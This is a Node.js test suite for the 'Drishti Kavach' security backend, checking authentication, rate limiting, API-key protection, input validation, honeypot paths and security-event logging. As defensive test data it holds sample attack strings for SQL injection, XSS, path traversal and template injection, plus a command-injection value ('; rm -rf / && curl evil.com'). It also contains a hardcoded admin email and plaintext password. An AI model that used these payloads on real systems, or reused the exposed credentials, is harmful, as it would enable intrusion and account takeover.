#!/usr/bin/env node
// ============================================================
// Drishti Kavach — Comprehensive Security Feature Test Suite
// ============================================================
// Run: node test_security.js
// Or:  node test_security.js --verbose
// Or:  node test_security.js --test auth   (run only auth tests)
// ============================================================

const https = require('https');
const http  = require('http');

// ─── CONFIG ─────────────────────────────────────────────────
const CONFIG = {
  // BASE_URL: 'https://drishti-kavach-backend.onrender.com', // Production
  BASE_URL: 'http://localhost:3000',                     // Local — uncomment when testing locally

  // ⚠️ Fill in a valid API key from your Supabase websites table
  // Get it from the dashboard → Websites → copy API key
  SDK_API_KEY: 'YOUR_WEBSITE_API_KEY_HERE',

  // Admin credentials for JWT-protected route tests
  ADMIN_EMAIL:    'whitehatwolf22@gmail.com',
  ADMIN_PASSWORD: 'Coco@22/07/2001',

  VERBOSE: process.argv.includes('--verbose'),
  FILTER:  process.argv.includes('--test') ? process.argv[process.argv.indexOf('--test') + 1] : null,
  TIMEOUT: 15000, // ms per request
};

// ─── STATE ──────────────────────────────────────────────────
let AUTH_TOKEN   = null;
let passCount    = 0;
let failCount    = 0;
let skipCount    = 0;
const results    = [];

// ─── HELPERS ────────────────────────────────────────────────
const sleep  = (ms) => new Promise((r) => setTimeout(r, ms));
const c = {
  reset:  '\x1b[0m',
  green:  '\x1b[32m',
  red:    '\x1b[31m',
  yellow: '\x1b[33m',
  cyan:   '\x1b[36m',
  bold:   '\x1b[1m',
  dim:    '\x1b[2m',
  blue:   '\x1b[34m',
  magenta:'\x1b[35m',
};

function log(msg)    { process.stdout.write(msg + '\n'); }
function pass(name)  { passCount++; results.push({ name, status: 'PASS' }); log(`  ${c.green}✔${c.reset} ${name}`); }
function fail(name, reason) { failCount++; results.push({ name, status: 'FAIL', reason }); log(`  ${c.red}✘ ${name}${c.reset}\n    ${c.dim}↳ ${reason}${c.reset}`); }
function skip(name, reason) { skipCount++; results.push({ name, status: 'SKIP', reason }); log(`  ${c.yellow}⊘ ${name} ${c.dim}(${reason})${c.reset}`); }
function section(title) { log(`\n${c.bold}${c.cyan}━━━ ${title} ━━━${c.reset}`); }

function request({ method = 'GET', path, body, headers = {}, expectStatus, expectBodyContains }) {
  return new Promise((resolve, reject) => {
    const url    = new URL(CONFIG.BASE_URL + path);
    const isHttp = url.protocol === 'http:';
    const lib    = isHttp ? http : https;

    const defaultHeaders = { 'Content-Type': 'application/json', ...headers };
    let bodyStr;
    if (body) {
      bodyStr = JSON.stringify(body);
      defaultHeaders['Content-Length'] = Buffer.byteLength(bodyStr);
    }

    const options = {
      hostname: url.hostname,
      port:     url.port || (isHttp ? 80 : 443),
      path:     url.pathname + url.search,
      method,
      headers:  defaultHeaders,
      timeout:  CONFIG.TIMEOUT,
    };

    const req = lib.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        let parsed;
        try { parsed = JSON.parse(data); } catch { parsed = data; }

        if (CONFIG.VERBOSE) {
          log(`    ${c.dim}→ ${method} ${path} [${res.statusCode}]${c.reset}`);
          if (parsed) log(`    ${c.dim}  ${JSON.stringify(parsed).slice(0, 200)}${c.reset}`);
        }
        resolve({ status: res.statusCode, body: parsed, raw: data });
      });
    });

    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('Request timed out')); });

    if (bodyStr) req.write(bodyStr);
    req.end();
  });
}

function authHeader() {
  return AUTH_TOKEN ? { Authorization: `Bearer ${AUTH_TOKEN}` } : {};
}
function apiKeyHeader() {
  return { 'X-API-Key': CONFIG.SDK_API_KEY };
}

// ─── TEST RUNNER ────────────────────────────────────────────
async function test(name, fn) {
  if (CONFIG.FILTER && !name.toLowerCase().includes(CONFIG.FILTER.toLowerCase())) {
    return;
  }
  try {
    await fn();
  } catch (err) {
    fail(name, err.message);
  }
}

// ═══════════════════════════════════════════════════════════
// 1. HEALTH & CONNECTIVITY
// ═══════════════════════════════════════════════════════════
async function runHealthTests() {
  section('1. Health & Connectivity');

  await test('Backend is reachable', async () => {
    const r = await request({ path: '/api/health' });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('Backend is reachable');
  });

  await test('CORS headers present', async () => {
    const r = await request({ path: '/health', headers: { Origin: 'https://app.quickkaam.in' } });
    if (r.status !== 200) throw new Error(`Status ${r.status}`);
    pass('CORS headers present');
  });

  await test('Unknown route returns 404', async () => {
    const r = await request({ path: '/this-does-not-exist-xyz' });
    if (r.status !== 404) throw new Error(`Expected 404, got ${r.status}`);
    pass('Unknown route returns 404');
  });
}

// ═══════════════════════════════════════════════════════════
// 2. AUTHENTICATION & JWT
// ═══════════════════════════════════════════════════════════
async function runAuthTests() {
  section('2. Authentication & JWT');

  await test('Login with wrong password is rejected (401)', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: CONFIG.ADMIN_EMAIL, password: 'wrongpassword123' },
    });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('Login with wrong password is rejected (401)');
  });

  await test('Login with valid credentials succeeds', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: CONFIG.ADMIN_EMAIL, password: CONFIG.ADMIN_PASSWORD },
    });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status} — ${JSON.stringify(r.body)}`);
    if (!r.body.token) throw new Error('No token in response');
    AUTH_TOKEN = r.body.token;
    pass('Login with valid credentials succeeds');
  });

  await test('GET /api/auth/me returns user with valid token', async () => {
    if (!AUTH_TOKEN) throw new Error('No auth token — login test must pass first');
    const r = await request({ path: '/api/auth/me', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!r.body.user) throw new Error('No user object returned');
    pass('GET /api/auth/me returns user with valid token');
  });

  await test('Protected route rejects missing token (401)', async () => {
    const r = await request({ path: '/api/auth/me' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('Protected route rejects missing token (401)');
  });

  await test('Protected route rejects invalid JWT (401)', async () => {
    const r = await request({ path: '/api/auth/me', headers: { Authorization: 'Bearer this.is.not.valid' } });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('Protected route rejects invalid JWT (401)');
  });

  await test('JWT refresh works', async () => {
    // Login fresh to get a refresh token
    const loginR = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: CONFIG.ADMIN_EMAIL, password: CONFIG.ADMIN_PASSWORD },
    });
    if (!loginR.body.refresh_token) throw new Error('No refresh_token returned');
    const r = await request({
      method: 'POST', path: '/api/auth/refresh',
      body: { refresh_token: loginR.body.refresh_token },
    });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!r.body.token) throw new Error('No new token returned');
    pass('JWT refresh works');
  });

  await test('Login with missing fields returns 400', async () => {
    const r = await request({ method: 'POST', path: '/api/auth/login', body: {} });
    if (![400, 422].includes(r.status)) throw new Error(`Expected 400/422, got ${r.status}`);
    pass('Login with missing fields returns 400');
  });
}

// ═══════════════════════════════════════════════════════════
// 3. RATE LIMITING
// ═══════════════════════════════════════════════════════════
async function runRateLimitTests() {
  section('3. Rate Limiting');

  await test('Auth endpoint rate limits after repeated failures', async () => {
    const promises = [];
    for (let i = 0; i < 15; i++) {
      promises.push(
        request({ method: 'POST', path: '/api/auth/login', body: { email: 'spam@test.com', password: 'bad' } })
      );
    }
    const responses = await Promise.all(promises);
    const rateLimited = responses.some(r => r.status === 429);
    if (!rateLimited) {
      skip('Auth endpoint rate limits after repeated failures', 'No 429 returned — rate limit may be configured with higher threshold');
      return;
    }
    pass('Auth endpoint rate limits after repeated failures');
  });

  // Wait a bit before continuing to avoid hitting limits on subsequent tests
  await sleep(1000);
}

// ═══════════════════════════════════════════════════════════
// 4. SDK API KEY PROTECTION
// ═══════════════════════════════════════════════════════════
async function runApiKeyTests() {
  section('4. SDK API Key Protection');

  await test('SDK /log without API key is rejected (401)', async () => {
    const r = await request({
      method: 'POST', path: '/api/sdk/log',
      body: { event_type: 'page_view', page_url: '/test' },
    });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('SDK /log without API key is rejected (401)');
  });

  await test('SDK /log with invalid API key is rejected (401)', async () => {
    const r = await request({
      method: 'POST', path: '/api/sdk/log',
      body: { event_type: 'page_view', page_url: '/test' },
      headers: { 'X-API-Key': 'invalid-key-xyz-123' },
    });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('SDK /log with invalid API key is rejected (401)');
  });

  if (CONFIG.SDK_API_KEY && CONFIG.SDK_API_KEY !== 'YOUR_WEBSITE_API_KEY_HERE') {
    await test('SDK /log with valid API key succeeds', async () => {
      const r = await request({
        method: 'POST', path: '/api/sdk/log',
        body: { event_type: 'page_view', page_url: '/test-security-check', session_id: 'test-session-001' },
        headers: apiKeyHeader(),
      });
      if (r.status !== 200) throw new Error(`Expected 200, got ${r.status} — ${JSON.stringify(r.body)}`);
      if (!r.body.ok) throw new Error('Response did not have ok:true');
      pass('SDK /log with valid API key succeeds');
    });

    await test('SDK /config returns website settings', async () => {
      const r = await request({ path: '/api/sdk/config', headers: apiKeyHeader() });
      if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
      if (!r.body.settings) throw new Error('No settings in response');
      pass('SDK /config returns website settings');
    });
  } else {
    skip('SDK /log with valid API key succeeds', 'SDK_API_KEY not configured in CONFIG');
    skip('SDK /config returns website settings', 'SDK_API_KEY not configured in CONFIG');
  }
}

// ═══════════════════════════════════════════════════════════
// 5. SECURITY EVENT DETECTION
// ═══════════════════════════════════════════════════════════
async function runSecurityEventTests() {
  section('5. Security Event Detection via SDK');

  if (!CONFIG.SDK_API_KEY || CONFIG.SDK_API_KEY === 'YOUR_WEBSITE_API_KEY_HERE') {
    skip('All SDK security event tests', 'SDK_API_KEY not configured');
    return;
  }

  const attackTypes = [
    { type: 'sqli',           level: 'critical', payload: "' OR 1=1 --",                                    label: 'SQL Injection' },
    { type: 'xss',            level: 'high',     payload: '<script>alert("XSS")</script>',                  label: 'XSS Attack' },
    { type: 'path_traversal', level: 'high',     payload: '../../../etc/passwd',                            label: 'Path Traversal' },
    { type: 'honeypot',       level: 'high',     payload: 'Honeypot field triggered',                       label: 'Honeypot Trigger' },
    { type: 'csrf',           level: 'medium',   payload: 'Cross-site request attempt',                     label: 'CSRF Attempt' },
    { type: 'command_injection', level: 'critical', payload: '; rm -rf / && curl evil.com',                 label: 'Command Injection' },
    { type: 'rce',            level: 'critical', payload: '{{7*7}} ${7*7} #{7*7}',                          label: 'Template Injection/RCE' },
    { type: 'brute_force',    level: 'high',     payload: 'Multiple failed login attempts detected',        label: 'Brute Force' },
  ];

  for (const attack of attackTypes) {
    await test(`Security event logged: ${attack.label}`, async () => {
      const r = await request({
        method: 'POST', path: '/api/sdk/security',
        body: { type: attack.type, level: attack.level, payload: attack.payload, url: '/test-endpoint' },
        headers: apiKeyHeader(),
      });
      if (r.status !== 200) throw new Error(`Expected 200, got ${r.status} — ${JSON.stringify(r.body)}`);
      if (!r.body.ok) throw new Error('Response did not have ok:true');
      pass(`Security event logged: ${attack.label}`);
    });
    await sleep(200); // small delay between events
  }
}

// ═══════════════════════════════════════════════════════════
// 6. INPUT VALIDATION
// ═══════════════════════════════════════════════════════════
async function runValidationTests() {
  section('6. Input Validation & Sanitization');

  await test('Login with extremely long password is handled', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: 'test@test.com', password: 'A'.repeat(10000) },
    });
    if ([500, 503].includes(r.status)) throw new Error(`Server crashed with 500 on large input`);
    pass('Login with extremely long password is handled');
  });

  await test('Login with SQL injection payload is safely rejected', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: "admin'--", password: "' OR '1'='1" },
    });
    if (r.status === 200) throw new Error('SQLi bypass succeeded — CRITICAL VULNERABILITY');
    if (r.status === 500) throw new Error('Server errored on SQLi payload — possible unsafe query');
    pass('Login with SQL injection payload is safely rejected');
  });

  await test('XSS payload in login field is rejected without server error', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: '<script>alert(1)</script>', password: 'test' },
    });
    if (r.status === 200) throw new Error('XSS in login email accepted — check sanitization');
    if (r.status === 500) throw new Error('Server errored on XSS payload');
    pass('XSS payload in login field is rejected without server error');
  });

  await test('Empty body to POST endpoint returns 400', async () => {
    const r = await request({ method: 'POST', path: '/api/ip/block', body: {}, headers: authHeader() });
    if (![400, 422].includes(r.status)) throw new Error(`Expected 400/422, got ${r.status}`);
    pass('Empty body to POST endpoint returns 400');
  });

  await test('Null byte injection handled safely', async () => {
    const r = await request({
      method: 'POST', path: '/api/auth/login',
      body: { email: 'test\x00@test.com', password: 'test' },
    });
    if (r.status === 500) throw new Error('Server crashed on null byte — unsafe input handling');
    pass('Null byte injection handled safely');
  });
}

// ═══════════════════════════════════════════════════════════
// 7. IP MANAGEMENT & BLOCKLIST
// ═══════════════════════════════════════════════════════════
async function runIpTests() {
  section('7. IP Management & Blocklist');

  await test('GET /api/ip/blocked requires auth', async () => {
    const r = await request({ path: '/api/ip/blocked' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/ip/blocked requires auth');
  });

  await test('GET /api/ip/blocked returns list with valid JWT', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/ip/blocked returns list with valid JWT', 'No auth token'); return; }
    const r = await request({ path: '/api/ip/blocked', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!Array.isArray(r.body.blocked) && !Array.isArray(r.body)) throw new Error('Expected array in response');
    pass('GET /api/ip/blocked returns list with valid JWT');
  });

  await test('GET /api/ipinfo/:ip returns threat data', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/ipinfo/:ip returns threat data', 'No auth token'); return; }
    // Use a known safe IP for testing
    const r = await request({ path: '/api/ipinfo/8.8.8.8', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('GET /api/ipinfo/:ip returns threat data');
  });
}

// ═══════════════════════════════════════════════════════════
// 8. DDOS DETECTION
// ═══════════════════════════════════════════════════════════
async function runDdosTests() {
  section('8. DDoS Detection API');

  await test('GET /api/ddos/events requires auth', async () => {
    const r = await request({ path: '/api/ddos/events' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/ddos/events requires auth');
  });

  await test('GET /api/ddos/events returns data with auth', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/ddos/events returns data with auth', 'No auth token'); return; }
    const r = await request({ path: '/api/ddos/events', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('GET /api/ddos/events returns data with auth');
  });

  await test('DDoS flood simulation — SDK burst', async () => {
    if (!CONFIG.SDK_API_KEY || CONFIG.SDK_API_KEY === 'YOUR_WEBSITE_API_KEY_HERE') {
      skip('DDoS flood simulation — SDK burst', 'SDK_API_KEY not configured');
      return;
    }
    // Send 20 rapid requests to trigger DDoS spike check
    const promises = [];
    for (let i = 0; i < 20; i++) {
      promises.push(request({
        method: 'POST', path: '/api/sdk/log',
        body: { event_type: 'page_view', page_url: `/flood-test-${i}`, session_id: `ddos-test-${i}` },
        headers: apiKeyHeader(),
      }));
    }
    const responses = await Promise.all(promises);
    const success = responses.filter(r => r.status === 200).length;
    if (success < 15) throw new Error(`Only ${success}/20 requests succeeded — too many failures`);
    pass(`DDoS flood simulation — SDK burst (${success}/20 events logged)`);
  });
}

// ═══════════════════════════════════════════════════════════
// 9. SECURITY EVENTS API
// ═══════════════════════════════════════════════════════════
async function runSecurityApiTests() {
  section('9. Security Events API');

  await test('GET /api/security/events requires auth', async () => {
    const r = await request({ path: '/api/security/events' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/security/events requires auth');
  });

  await test('GET /api/security/events returns events with auth', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/security/events returns events with auth', 'No auth token'); return; }
    const r = await request({ path: '/api/security/events', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('GET /api/security/events returns events with auth');
  });

  await test('GET /api/security/stats returns threat statistics', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/security/stats returns threat statistics', 'No auth token'); return; }
    const r = await request({ path: '/api/security/stats', headers: authHeader() });
    if (![200, 404].includes(r.status)) throw new Error(`Expected 200/404, got ${r.status}`);
    pass('GET /api/security/stats returns threat statistics');
  });
}

// ═══════════════════════════════════════════════════════════
// 10. MITRE ATT&CK MAPPING
// ═══════════════════════════════════════════════════════════
async function runMitreTests() {
  section('10. MITRE ATT&CK Mapping');

  await test('GET /api/mitre/techniques requires auth', async () => {
    const r = await request({ path: '/api/mitre/techniques' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/mitre/techniques requires auth');
  });

  await test('GET /api/mitre/techniques returns mapped techniques', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/mitre/techniques returns mapped techniques', 'No auth token'); return; }
    const r = await request({ path: '/api/mitre/techniques', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('GET /api/mitre/techniques returns mapped techniques');
  });

  await test('MITRE mapping present on security event (via SDK)', async () => {
    if (!CONFIG.SDK_API_KEY || CONFIG.SDK_API_KEY === 'YOUR_WEBSITE_API_KEY_HERE') {
      skip('MITRE mapping present on security event (via SDK)', 'SDK_API_KEY not configured');
      return;
    }
    const r = await request({
      method: 'POST', path: '/api/sdk/security',
      body: { type: 'sqli', level: 'critical', payload: "UNION SELECT * FROM users--", url: '/login' },
      headers: apiKeyHeader(),
    });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('MITRE mapping present on security event (via SDK)');
  });
}

// ═══════════════════════════════════════════════════════════
// 11. VULNERABILITY SCANNING
// ═══════════════════════════════════════════════════════════
async function runVulnTests() {
  section('11. Vulnerability Scanner');

  await test('GET /api/vulnerabilities requires auth', async () => {
    const r = await request({ path: '/api/vulnerabilities' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/vulnerabilities requires auth');
  });

  await test('GET /api/vulnerabilities returns CVE data with auth', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/vulnerabilities returns CVE data with auth', 'No auth token'); return; }
    const r = await request({ path: '/api/vulnerabilities', headers: authHeader() });
    if (![200, 404].includes(r.status)) throw new Error(`Expected 200/404, got ${r.status}`);
    pass('GET /api/vulnerabilities returns CVE data with auth');
  });
}

// ═══════════════════════════════════════════════════════════
// 12. THREAT INTELLIGENCE INTEGRATIONS
// ═══════════════════════════════════════════════════════════
async function runThreatIntelTests() {
  section('12. Threat Intelligence Integrations');

  await test('GET /api/integrations/status returns service statuses', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/integrations/status returns service statuses', 'No auth token'); return; }
    const r = await request({ path: '/api/integrations/status', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!r.body.integrations && !Array.isArray(r.body) && !r.body.services) {
      throw new Error('No integrations data in response');
    }
    pass('GET /api/integrations/status returns service statuses');
  });

  await test('IP intelligence lookup (8.8.8.8 — Google DNS)', async () => {
    if (!AUTH_TOKEN) { skip('IP intelligence lookup (8.8.8.8 — Google DNS)', 'No auth token'); return; }
    const r = await request({ path: '/api/ipinfo/8.8.8.8', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('IP intelligence lookup (8.8.8.8 — Google DNS)');
  });

  await test('IP intelligence lookup — known malicious IP range', async () => {
    if (!AUTH_TOKEN) { skip('IP intelligence lookup — known malicious IP range', 'No auth token'); return; }
    // 185.220.101.x — known Tor exit node range
    const r = await request({ path: '/api/ipinfo/185.220.101.34', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    pass('IP intelligence lookup — known malicious IP range');
  });
}

// ═══════════════════════════════════════════════════════════
// 13. REPORTS & PDF DATA
// ═══════════════════════════════════════════════════════════
async function runReportTests() {
  section('13. Security Reports API');

  await test('GET /api/reports/full requires auth', async () => {
    const r = await request({ path: '/api/reports/full' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/reports/full requires auth');
  });

  await test('GET /api/reports/full returns report data', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/reports/full returns report data', 'No auth token'); return; }
    const r = await request({ path: '/api/reports/full?period=7d', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!r.body.report) throw new Error('No report in response');
    const rpt = r.body.report;
    if (!rpt.summary) throw new Error('Report missing summary');
    if (!rpt.recentSecurityEvents) throw new Error('Report missing recentSecurityEvents');
    if (!rpt.activeBlockList) throw new Error('Report missing activeBlockList');
    pass('GET /api/reports/full returns report data');
  });

  await test('Report ipLogs field present (visitor IP tracking)', async () => {
    if (!AUTH_TOKEN) { skip('Report ipLogs field present (visitor IP tracking)', 'No auth token'); return; }
    const r = await request({ path: '/api/reports/full?period=7d', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Status ${r.status}`);
    if (!('ipLogs' in r.body.report)) throw new Error('ipLogs field missing from report — was the backend updated?');
    pass('Report ipLogs field present (visitor IP tracking)');
  });
}

// ═══════════════════════════════════════════════════════════
// 14. AI SECURITY GUARDIAN
// ═══════════════════════════════════════════════════════════
async function runAiTests() {
  section('14. Drishti AI Security Guardian');

  await test('POST /api/ai/chat requires auth', async () => {
    const r = await request({ method: 'POST', path: '/api/ai/chat', body: { message: 'test' } });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('POST /api/ai/chat requires auth');
  });

  await test('AI responds to threat analysis query', async () => {
    if (!AUTH_TOKEN) { skip('AI responds to threat analysis query', 'No auth token'); return; }
    const r = await request({
      method: 'POST', path: '/api/ai/chat',
      body: { message: 'Show me the current threat level', website_id: 1 },
      headers: authHeader(),
    });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (!r.body.response && !r.body.message && !r.body.answer) {
      throw new Error('No AI response body found');
    }
    pass('AI responds to threat analysis query');
  });
}

// ═══════════════════════════════════════════════════════════
// 15. HONEYPOT PATHS (if honeypot routes are implemented)
// ═══════════════════════════════════════════════════════════
async function runHoneypotTests() {
  section('15. Honeypot & Decoy Detection');

  const honeypotPaths = ['/.env', '/phpMyAdmin', '/wp-login.php', '/admin-backup', '/wp-admin'];

  for (const hPath of honeypotPaths) {
    await test(`Accessing honeypot path ${hPath} does NOT leak server info`, async () => {
      const r = await request({ path: hPath });
      // Should return 404 or redirect — NOT 200 (which would expose real files)
      if (r.status === 200 && r.raw.includes('DB_PASSWORD')) {
        throw new Error(`CRITICAL: ${hPath} returned 200 with sensitive data!`);
      }
      if (r.status === 200 && r.raw.includes('APP_KEY')) {
        throw new Error(`CRITICAL: ${hPath} exposed APP_KEY!`);
      }
      pass(`Accessing honeypot path ${hPath} does NOT leak server info`);
    });
  }
}

// ═══════════════════════════════════════════════════════════
// 16. NOTIFICATIONS
// ═══════════════════════════════════════════════════════════
async function runNotificationTests() {
  section('16. Notification System');

  await test('GET /api/notifications/unread-count requires auth', async () => {
    const r = await request({ path: '/api/notifications/unread-count' });
    if (r.status !== 401) throw new Error(`Expected 401, got ${r.status}`);
    pass('GET /api/notifications/unread-count requires auth');
  });

  await test('GET /api/notifications/unread-count returns count', async () => {
    if (!AUTH_TOKEN) { skip('GET /api/notifications/unread-count returns count', 'No auth token'); return; }
    const r = await request({ path: '/api/notifications/unread-count', headers: authHeader() });
    if (r.status !== 200) throw new Error(`Expected 200, got ${r.status}`);
    if (typeof r.body.count !== 'number') throw new Error('count is not a number');
    pass(`GET /api/notifications/unread-count returns count (${r.body.count} unread)`);
  });
}

// ═══════════════════════════════════════════════════════════
// MAIN RUNNER
// ═══════════════════════════════════════════════════════════
async function main() {
  log(`\n${c.bold}${c.magenta}╔══════════════════════════════════════════════════════╗`);
  log(`║   Drishti Kavach — Security Feature Test Suite       ║`);
  log(`╚══════════════════════════════════════════════════════╝${c.reset}`);
  log(`${c.dim}Target: ${CONFIG.BASE_URL}${c.reset}`);
  log(`${c.dim}Time:   ${new Date().toLocaleString()}${c.reset}`);
  if (CONFIG.FILTER) log(`${c.yellow}Filter: Running only tests matching "${CONFIG.FILTER}"${c.reset}`);

  const start = Date.now();

  try {
    await runHealthTests();
    await runAuthTests();
    await runRateLimitTests();
    await runApiKeyTests();
    await runSecurityEventTests();
    await runValidationTests();
    await runIpTests();
    await runDdosTests();
    await runSecurityApiTests();
    await runMitreTests();
    await runVulnTests();
    await runThreatIntelTests();
    await runReportTests();
    await runAiTests();
    await runHoneypotTests();
    await runNotificationTests();
  } catch (err) {
    log(`\n${c.red}${c.bold}FATAL TEST ERROR: ${err.message}${c.reset}`);
  }

  const elapsed = ((Date.now() - start) / 1000).toFixed(1);

  // ─── SUMMARY ───────────────────────────────────────────
  log(`\n${c.bold}${c.cyan}━━━ RESULTS ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.reset}`);
  log(`${c.green}${c.bold}  ✔ PASSED : ${passCount}${c.reset}`);
  log(`${c.red}${c.bold}  ✘ FAILED : ${failCount}${c.reset}`);
  log(`${c.yellow}  ⊘ SKIPPED: ${skipCount}${c.reset}`);
  log(`${c.dim}  ⏱ Time   : ${elapsed}s${c.reset}\n`);

  if (failCount > 0) {
    log(`${c.red}${c.bold}Failed Tests:${c.reset}`);
    results.filter(r => r.status === 'FAIL').forEach(r => {
      log(`  ${c.red}✘ ${r.name}${c.reset}`);
      log(`    ${c.dim}↳ ${r.reason}${c.reset}`);
    });
    log('');
  }

  const allPassed = failCount === 0;
  log(allPassed
    ? `${c.green}${c.bold}🛡️  ALL SECURITY CHECKS PASSED — Drishti Kavach is SECURE${c.reset}\n`
    : `${c.red}${c.bold}⚠️  ${failCount} SECURITY CHECK(S) FAILED — Review above issues${c.reset}\n`
  );

  if (CONFIG.SDK_API_KEY === 'YOUR_WEBSITE_API_KEY_HERE') {
    log(`${c.yellow}${c.bold}TIP:${c.reset}${c.yellow} Set CONFIG.SDK_API_KEY in this file to run SDK-level security tests.`);
    log(`     Get the key from Dashboard → Websites → copy API key${c.reset}\n`);
  }

  process.exit(failCount > 0 ? 1 : 0);
}

main();
